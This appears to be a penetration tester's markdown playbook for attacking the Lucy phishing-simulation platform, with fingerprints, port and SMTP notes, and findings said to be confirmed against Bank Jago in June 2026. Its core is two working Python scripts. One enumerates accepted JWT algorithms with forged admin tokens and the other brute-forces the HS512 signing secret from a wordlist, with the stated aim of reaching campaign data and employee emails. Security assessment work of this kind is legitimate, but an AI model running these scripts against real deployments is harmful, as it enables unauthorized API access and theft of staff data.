# Lucy Security Awareness Platform Assessment

## Overview

Lucy (ThriveDX) is a phishing simulation/security awareness platform. Common at Indonesian banks (Dkatalis/Jago uses it).

## Fingerprint

- Server header: `Lucy`
- Login: `/admin/login` (Yii framework)
- Form fields: `LoginForm[email]`, `LoginForm[password]`, `YII_CSRF_TOKEN`
- CORS: Often `ACAO: *`, `ACAM: *`, `ACAH: *` (wildcard, no creds)
- Hosted on Hetzner typically (5.75.x.x)

## API Authentication (JWT)

Lucy REST API uses JWT Bearer tokens. Endpoint: `/api/version`, `/api/campaigns`, `/api/domains`.

### Algorithm Enumeration (Confirmed — Bank Jago, June 2026)

Send tokens with different `alg` values. Error messages reveal accepted algorithm:

```python
import base64, json, subprocess

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

algorithms = ['HS256','HS384','HS512','RS256','RS384','RS512','none']

for alg in algorithms:
    header = b64url(json.dumps({'alg':alg,'typ':'JWT'}, separators=(',',':')).encode())
    payload = b64url(json.dumps({'sub':'1','name':'admin','iat':1516239022}, separators=(',',':')).encode())
    token = f"{header}.{payload}.invalidsig"
    # curl -sk -H "Authorization: Bearer $token" https://TARGET/api/version
```

**Error message interpretation:**
| Response | Meaning |
|----------|---------|
| `"Algorithm not supported"` | Library doesn't implement it (dead end) |
| `"Algorithm not allowed"` | Recognized but policy-blocked (not usable) |
| `"Signature verification failed"` | **ACCEPTED** — target for brute-force |
| `"Wrong number of segments"` | Token format issue (not JWT) |
| `"No token header."` | Missing Authorization header |

**Bank Jago result:** HS512 accepted. HS256/384/RS256 blocked. none unsupported.

### JWT Secret Brute-Force

Once algorithm identified, brute-force with wordlist:

```python
import hmac, hashlib, base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({'alg':'HS512','typ':'JWT'}, separators=(',',':')).encode())
payload = b64url(json.dumps({'sub':'1','name':'admin','iat':1516239022}, separators=(',',':')).encode())
msg = f'{header}.{payload}'.encode()

with open('jwt-secrets.txt') as f:
    for line in f:
        secret = line.strip()
        sig = b64url(hmac.new(secret.encode(), msg, hashlib.sha512).digest())
        token = f'{header}.{payload}.{sig}'
        # Test against /api/version — non-error response = cracked
```

**Wordlist:** `~/PenTest/Tools/wordlists/jwt-secrets.txt` (104K entries)

**Pitfall:** Network flakes during brute-force cause false positives (empty response ≠ valid secret). Always re-verify a "found" secret 3 times before claiming success.

## Web Login

- Yii framework with CSRF token
- Login always returns 200 regardless of success/failure (check redirect or title)
- No user enumeration via error messages
- `/loginforms` — publicly accessible phishing template definitions (not a finding)

## SMTP (Port 25)

Lucy servers often run Postfix for sending phishing emails:
- Banner: `220 mail.cloudserver1008.com ESMTP Postfix (Ubuntu)`
- Requires AUTH PLAIN LOGIN before relay
- Rejects RCPT TO without auth ("554 5.7.1 Access denied")
- Disconnects after 2 failed attempts ("421 too many errors")
- NOT an open relay (confirmed Bank Jago June 2026)

## Additional Ports

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | Standard |
| 25 | SMTP (Postfix) | Auth required |
| 80 | HTTP (Lucy) | Redirects to 443 |
| 443 | HTTPS (Lucy) | Main admin |
| 8080 | HTTP-alt | Often same Lucy (redirects to 443) |
| 8443 | HTTPS-alt | Same Lucy instance |

## CVEs

- CVE-2021-28132 (Lucy < 4.7.x RCE): Patched in newer versions
- `/admin/support/migration` returns 404 (not 400) on current versions
- `/public/system/static/` returns 403 (locked down)

## Findings Priority

1. JWT HS512 brute-force → API access → campaign data + employee emails (HIGH if cracked)
2. CORS wildcard (INFO — no credentials, browsers won't send cookies)
3. TLS 1.1 supported (LOW)
